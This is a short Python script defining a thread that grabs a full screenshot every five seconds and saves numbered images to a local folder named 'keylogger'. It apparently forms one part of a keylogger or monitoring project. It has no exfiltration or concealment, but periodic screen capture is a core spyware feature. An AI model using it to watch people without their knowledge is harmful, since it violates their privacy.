from PIL import ImageGrab
from threading import Thread
import time


class Screenshot(Thread):

    def __init__(self):
        Thread.__init__(self, name='screenshots')
        self.__screenshotFrequency = 5
        self.__screenshotNumber = 0
        self.__active = False


    @property
    def isActive(self):
        return self.__active


    @isActive.setter
    def isActive(self, active:bool):
        if self.__active != active:
            print(f'Screenshot active: {active}')
        self.__active = active


    def run(self):
        while True:
            if self.__active: 
                time.sleep(self.__screenshotFrequency)
                pic = ImageGrab.grab()
                self.__screenshotNumber += 1
                pic.save(f'C:\\Users\\forro\\Desktop\\keylogger\\pic\\{self.__screenshotNumber}.jpg')
                print('Screenshot has been taken!')




if __name__ == "__main__":
    screenshot = Screenshot()
    screenshot.start()